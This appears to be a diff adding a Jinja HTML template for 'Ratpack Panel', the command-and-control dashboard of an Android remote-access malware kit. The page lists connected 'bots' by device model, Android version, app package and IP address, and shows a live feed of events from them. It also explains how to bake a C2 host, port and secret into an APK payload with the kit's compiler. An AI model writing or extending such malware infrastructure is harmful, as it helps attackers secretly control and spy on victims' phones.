@@ -1,0 +1,76 @@
+{% extends "base.html" %}
+{% block title %}Ratpack Panel — bots{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="card grow">
+        <h2>Bots <span class="muted">({{ bots|length }})</span></h2>
+        {% if error %}<div class="alert">C2 unreachable: {{ error }}</div>{% endif %}
+        <table>
+            <thead>
+            <tr>
+                <th>id</th><th>device</th><th>os</th><th>package</th>
+                <th>addr</th><th>silent</th><th></th>
+            </tr>
+            </thead>
+            <tbody>
+            {% for b in bots %}
+            <tr>
+                <td><a href="/bot/{{ b.id }}">{{ b.id }}</a></td>
+                <td>{{ b.info.get('brand','') }} {{ b.info.get('model','') }}</td>
+                <td>Android {{ b.info.get('android','') }} (API {{ b.info.get('sdk','') }})</td>
+                <td>{{ b.info.get('package','') }}</td>
+                <td class="muted">{{ b.addr }}</td>
+                <td class="muted">{{ b.silent_for }}s</td>
+                <td><a href="/bot/{{ b.id }}">open</a></td>
+            </tr>
+            {% else %}
+            <tr><td colspan="7" class="muted">no bots connected</td></tr>
+            {% endfor %}
+            </tbody>
+        </table>
+    </div>
+
+    <div class="card">
+        <h2>Live events</h2>
+        <div class="events" id="events">
+            {% for e in events %}
+            <div class="event">
+                <span class="tag">{{ e.get('type','?') }}</span>
+                <span class="muted">{{ e.get('bot','') }}</span>
+                <pre>{{ e.get('data',{})|tojson(indent=1) }}</pre>
+            </div>
+            {% else %}
+            <p class="muted">no events yet</p>
+            {% endfor %}
+        </div>
+    </div>
+</div>
+
+<div class="card">
+    <h2>Compiler configuration</h2>
+    <p class="muted">
+        Download <a href="/setting.json">setting.json</a> and drop it into
+        <code>Ratpack/Compiler/</code> before compiling. The compiler bakes it into the APK
+        as <code>assets/setting.json</code> and patches the payload's config with the same values.
+    </p>
+    <pre>{% raw %}{
+  "version": 1,
+  "server": {
+    "host": "{{ config.c2.host }}",
+    "port": {{ config.c2.port }},
+    "protocol": "{{ config.c2.protocol }}",
+    "secret": "{{ config.secret }}",
+    "beacon_ms": {{ config.beacon_ms }},
+    "timeout_ms": {{ config.timeout_ms }},
+    "tag": "{{ config.tag }}"
+  }
+}{% endraw %}</pre>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+setInterval(function () { location.reload(); }, 5000);
+</script>
+{% endblock %}
